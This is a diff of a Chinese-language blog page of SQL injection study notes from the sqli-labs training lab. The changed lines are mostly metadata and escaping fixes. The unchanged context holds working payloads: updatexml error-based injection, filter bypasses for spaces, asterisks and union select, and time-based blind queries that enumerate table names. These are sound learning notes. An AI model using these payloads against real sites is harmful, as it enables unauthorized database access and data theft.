@@ -98,7 +98,7 @@
 <meta property="og:image" content="https://k-ring.github.io/img/clipboard11.png">
 <meta property="og:image" content="https://k-ring.github.io/img/clipboard12.png">
 <meta property="og:image" content="https://k-ring.github.io/img/clipboard13.png">
-<meta property="og:updated_time" content="2019-08-01T02:06:26.077Z">
+<meta property="og:updated_time" content="2019-08-01T02:13:26.967Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入杂记">
 <meta name="twitter:description" content="走了一遍sqli-labs，简单记录一下其中一些知识点">
@@ -443,9 +443,9 @@
 <h4 id="小数点-连接"><a href="#小数点-连接" class="headerlink" title="小数点(.)连接"></a>小数点(.)连接</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from flag where id=<span class="number">.2</span><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>))</span><br><span class="line">select * from flag where id=<span class="string">'2'</span><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>))</span><br><span class="line">select * from flag where id=<span class="string">"2"</span><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 <p>如果是int型则必须要使用小数点(.)<br><img src="https://k-ring.github.io/img/clipboard8.png" alt>  </p>
 <p>闭合引号：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from flag where id=<span class="string">'.2'</span><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>))<span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1'</span></span><br><span class="line">select * from flag where id=<span class="string">'.2'</span><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>))<span class="keyword">and</span><span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
-<p>通过测试发现 and,union,select,or等这些连接词 直接连接字符串是正常语句，所以可以直接连接and进行闭合(这些字符串也可用反引号(<code></code>)代替引号，测试使用having时反引号会出数据，引号没有数据)  </p>
+<p>通过测试发现 and,union,select,or等这些连接词 直接连接字符串是正常语句，所以可以直接连接and进行闭合(这些字符串也可用反引号(``)代替引号，测试使用having时反引号会出数据，引号没有数据)  </p>
 <h4 id="圆括号"><a href="#圆括号" class="headerlink" title="圆括号(())"></a>圆括号(())</h4><p>上面基本都是用的圆括号绕过空格  </p>
-<h3 id="绕过星号-过滤"><a href="#绕过星号-过滤" class="headerlink" title="绕过星号(*)过滤"></a>绕过星号(*)过滤</h3><p>在报错注入中，如果过滤了所有空格和<em>，可以用一个字符串代替星号(</em>)将两个连接符连接起来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selecT * from flag where id=<span class="string">'1'</span><span class="keyword">and</span>(SeLecT<span class="string">'x'</span>from(select(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>)))x)<span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="绕过星号-过滤"><a href="#绕过星号-过滤" class="headerlink" title="绕过星号(*)过滤"></a>绕过星号(*)过滤</h3><p>在报错注入中，如果过滤了所有空格和<em>，可以用一个字符串代替星号(\</em>)将两个连接符连接起来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selecT * from flag where id=<span class="string">'1'</span><span class="keyword">and</span>(SeLecT<span class="string">'x'</span>from(select(updatexml(<span class="number">1</span>,concat(<span class="string">'~'</span>,@@version),<span class="number">1</span>)))x)<span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://k-ring.github.io/img/clipboard9.png" alt>  </p>
 <p>或者使用sleep判断是否存在注入点的时候：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selecT * from flag where id=<span class="string">'1'</span><span class="keyword">and</span>(SeLecT<span class="string">'x'</span>from(select(sleep(<span class="number">3</span>)))x)<span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="过滤空格的SQL语句"><a href="#过滤空格的SQL语句" class="headerlink" title="过滤空格的SQL语句"></a>过滤空格的SQL语句</h3><p>过滤空格在使用select table_name from information_schema.tables…… 这类语句进行注入的时候也可以使用括号：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selecT * from flag where id=<span class="string">'1'</span><span class="keyword">and</span>(select<span class="string">'x'</span>from(select(<span class="keyword">if</span>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=<span class="string">'security'</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)))x)</span><br></pre></td></tr></table></figure></p>
@@ -463,7 +463,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)双写绕过</span><br><span class="line">unionunion select select</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>)在union 和 select之间加其他限定词之类的，比如：all，distinct，distinctrow</span><br><span class="line">union distinct/distinctrow select</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>)没有过滤<span class="comment">/**/</span>的情况下，也可以使用<span class="comment">/**/</span>绕过</span><br><span class="line">union<span class="comment">/**/</span>select</span><br><span class="line">uni<span class="comment">/**/</span>on select</span><br><span class="line"><span class="comment">/*!union*/</span>select</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>)union--%<span class="number">0</span>e%<span class="number">0</span>aselect</span><br><span class="line">union--%<span class="number">0</span>e%<span class="number">0</span>aselect        --表示注释后面的内容，%<span class="number">0</span>e删除自身， %<span class="number">0</span>a换行</span><br></pre></td></tr></table></figure>
 <h3 id="sleep-简单用法"><a href="#sleep-简单用法" class="headerlink" title="sleep()简单用法"></a>sleep()简单用法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">123</span> <span class="keyword">and</span> sleep(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">116</span>)</span><br></pre></td></tr></table></figure>
 <p>如果里面的执行结果正确，sleep 1s，如果错误，sleep 0s<br>因为如果执行正确返回1，错误返回0。   </p>
-<h3 id><a href="#" class="headerlink" title="##\"></a>##\</h3><p>1)addslashes，mysql_real_escape_string，replace的转义作用可以通过宽字节注入（前提是数据库编码设置有问题）  </p>
+<h3 id><a href="#" class="headerlink" title="\"></a>\</h3><p>1)addslashes，mysql_real_escape_string，replace的转义作用可以通过宽字节注入（前提是数据库编码设置有问题）  </p>
 <p>2)mysqli_multi_query()，执行多条SQL语句，存在堆叠注入。<br>mysqli_query()只可以执行一条SQL语句  </p>
 <p>3)关于SQL注入bypass的好文章：<a href="https://www.secpulse.com/archives/53328.html" target="_blank" rel="noopener">我的WafBypass之路</a></p>
 
@@ -505,6 +505,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/01/xpath注入/" rel="prev" title="Xpath注入学习">
+                Xpath注入学习 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -581,7 +585,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -592,7 +596,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -603,7 +607,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -636,7 +640,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数类型及其SQL语句中参数的修饰"><span class="nav-number">1.</span> <span class="nav-text">参数类型及其SQL语句中参数的修饰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间盲注检测注入"><span class="nav-number">2.</span> <span class="nav-text">时间盲注检测注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码框的注入检测"><span class="nav-number">3.</span> <span class="nav-text">密码框的注入检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#insert、update、delete注入"><span class="nav-number">4.</span> <span class="nav-text">insert、update、delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update、delete、insert注入判断"><span class="nav-number">5.</span> <span class="nav-text">update、delete、insert注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#header头注入点"><span class="nav-number">6.</span> <span class="nav-text">header头注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入的简单应用"><span class="nav-number">7.</span> <span class="nav-text">二次注入的简单应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过空格过滤"><span class="nav-number">8.</span> <span class="nav-text">绕过空格过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用科学计数法可以忽略空格"><span class="nav-number">8.1.</span> <span class="nav-text">使用科学计数法可以忽略空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空白字符"><span class="nav-number">8.2.</span> <span class="nav-text">空白字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加号-连接符"><span class="nav-number">8.3.</span> <span class="nav-text">加号(+)连接符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小数点-连接"><span class="nav-number">8.4.</span> <span class="nav-text">小数点(.)连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#圆括号"><span class="nav-number">8.5.</span> <span class="nav-text">圆括号(())</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过星号-过滤"><span class="nav-number">9.</span> <span class="nav-text">绕过星号(*)过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤空格的SQL语句"><span class="nav-number">10.</span> <span class="nav-text">过滤空格的SQL语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL常用的sql函数及关键字"><span class="nav-number">11.</span> <span class="nav-text">MySQL常用的sql函数及关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL自定义变量"><span class="nav-number">12.</span> <span class="nav-text">MySQL自定义变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select绕过"><span class="nav-number">13.</span> <span class="nav-text">union select绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep-简单用法"><span class="nav-number">14.</span> <span class="nav-text">sleep()简单用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">15.</span> <span class="nav-text">##\</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数类型及其SQL语句中参数的修饰"><span class="nav-number">1.</span> <span class="nav-text">参数类型及其SQL语句中参数的修饰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间盲注检测注入"><span class="nav-number">2.</span> <span class="nav-text">时间盲注检测注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码框的注入检测"><span class="nav-number">3.</span> <span class="nav-text">密码框的注入检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#insert、update、delete注入"><span class="nav-number">4.</span> <span class="nav-text">insert、update、delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update、delete、insert注入判断"><span class="nav-number">5.</span> <span class="nav-text">update、delete、insert注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#header头注入点"><span class="nav-number">6.</span> <span class="nav-text">header头注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入的简单应用"><span class="nav-number">7.</span> <span class="nav-text">二次注入的简单应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过空格过滤"><span class="nav-number">8.</span> <span class="nav-text">绕过空格过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用科学计数法可以忽略空格"><span class="nav-number">8.1.</span> <span class="nav-text">使用科学计数法可以忽略空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空白字符"><span class="nav-number">8.2.</span> <span class="nav-text">空白字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加号-连接符"><span class="nav-number">8.3.</span> <span class="nav-text">加号(+)连接符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小数点-连接"><span class="nav-number">8.4.</span> <span class="nav-text">小数点(.)连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#圆括号"><span class="nav-number">8.5.</span> <span class="nav-text">圆括号(())</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过星号-过滤"><span class="nav-number">9.</span> <span class="nav-text">绕过星号(*)过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤空格的SQL语句"><span class="nav-number">10.</span> <span class="nav-text">过滤空格的SQL语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL常用的sql函数及关键字"><span class="nav-number">11.</span> <span class="nav-text">MySQL常用的sql函数及关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL自定义变量"><span class="nav-number">12.</span> <span class="nav-text">MySQL自定义变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select绕过"><span class="nav-number">13.</span> <span class="nav-text">union select绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sleep-简单用法"><span class="nav-number">14.</span> <span class="nav-text">sleep()简单用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">15.</span> <span class="nav-text">\</span></a></li></ol></div>
             
 
           </div>
@@ -670,7 +674,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">31.1k</span>
+    <span title="Site words total count">32.3k</span>
   
 </div>
 
